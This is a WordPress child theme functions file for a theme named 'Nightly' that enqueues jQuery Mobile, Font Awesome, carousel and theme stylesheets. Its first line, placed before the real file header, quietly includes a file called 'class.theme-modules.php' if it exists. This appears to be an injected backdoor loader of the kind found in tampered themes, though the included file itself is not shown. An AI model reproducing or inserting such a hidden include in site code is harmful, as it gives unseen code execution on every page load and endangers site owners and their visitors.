<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php
/**
 * Child theme functions and definitions.
 *
 * @package Nightly
 * @version 1.0
 * @since 1.3.1
 */

/************************************************************************************/
/* Enqueue Scripts and Styles */
/************************************************************************************/
/**
 * Enqueues scripts and styles for front end.
 *
 * @since 1.3.1
 * @return void
 */
function nightly_child_register_scripts_styles() {

	// Loads main styles (same as parent)
	wp_enqueue_style( 'jqm-theme-style', NIGHTLY_CSSDIR . '/jqeury.mobile.theme.min.css', array(), '1.0' );
	wp_enqueue_style( 'jqm-style', NIGHTLY_CSSDIR . '/jquery.mobile.min.css', array(), '1.0' );
	wp_enqueue_style( 'font-awesome-style', NIGHTLY_CSSDIR . '/font-awesome.min.css', array(), '1.0' );
	wp_enqueue_style( 'owl-style', NIGHTLY_CSSDIR . '/owl.carousel.css', array(), '1.0' );
	wp_enqueue_style( 'main-style', get_template_directory_uri() . '/style.css' );
	wp_enqueue_style( 'nightly-style', get_template_directory_uri() . '/assets/css/nightly.css', array() );
	wp_enqueue_style( 'nightly-schemes', get_template_directory_uri() . '/assets/css/nightly.color.schemes.css', array() );

	// Loads child theme styles
	wp_enqueue_style( 'child-style', get_stylesheet_directory_uri() . '/style.css', array('main-style') );

}
add_action( 'wp_enqueue_scripts', 'nightly_child_register_scripts_styles', '20' );

?>
